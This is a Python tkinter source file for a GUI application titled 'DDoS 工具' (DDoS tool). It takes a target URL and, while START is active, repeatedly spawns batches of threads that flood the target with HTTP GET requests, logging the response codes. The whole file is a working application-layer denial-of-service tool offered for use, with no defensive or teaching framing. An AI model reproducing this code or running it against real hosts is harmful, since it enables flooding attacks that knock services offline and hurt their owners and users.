import tkinter as tk
from datetime import datetime
from threading import Thread
from tkinter import scrolledtext as st
from traceback import format_exc

import requests as rq

log = []
g_start = False


def boom(the_host):
    try:
        for _ in range(20):
            if not g_start:
                return
            resp = rq.get(the_host, timeout=10)
            now = datetime.now()
            t = now.strftime('%H:%M:%S')
            log.append('[%s] GET: %s [%d]' % (t, the_host, resp.status_code))
    except Exception:
        print(format_exc())
        now = datetime.now()
        t = now.strftime('%H:%M:%S')
        log.append('[%s] GET: %s [FAIL]' % (t, the_host))


def update():
    global g_start
    try:
        g_start = start.get()
        if start.get():
            for _ in range(30):
                Thread(target=boom, daemon=True, args=(host.get(),)).start()
    except Exception:
        pass
    try:
        text.delete('1.0', tk.END)
        text.insert('1.0', '\n'.join(log))
        text.see(tk.END)
        root.update()
    except Exception:
        pass
    root.after(20, update)


root = tk.Tk()
root.title('DDoS 工具')

host = tk.StringVar(value='http://127.0.0.1')  # noqa
start = tk.BooleanVar(value=False)

tk.Label(root, text='DDoS 工具', font=('Arial', 30)).pack(padx=20, pady=10)
tk.Entry(root, textvariable=host, highlightbackground='white', font=('Arial', 20)).pack(padx=20, pady=10, fill=tk.X)
tk.Button(root, text='START', command=lambda: start.set(True), font=('Arial', 20)).pack(padx=20, pady=10, fill=tk.X)
tk.Button(root, text='END', command=lambda: start.set(False), font=('Arial', 20)).pack(padx=20, pady=10, fill=tk.X)
tk.Label(root, textvariable=start, font=('Arial', 20)).pack(padx=20, pady=10)
text = st.ScrolledText(root, font=('Arial', 15), highlightbackground='white', width=40, height=20)
text.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)

root.after(100, update)
root.focus_force()
root.mainloop()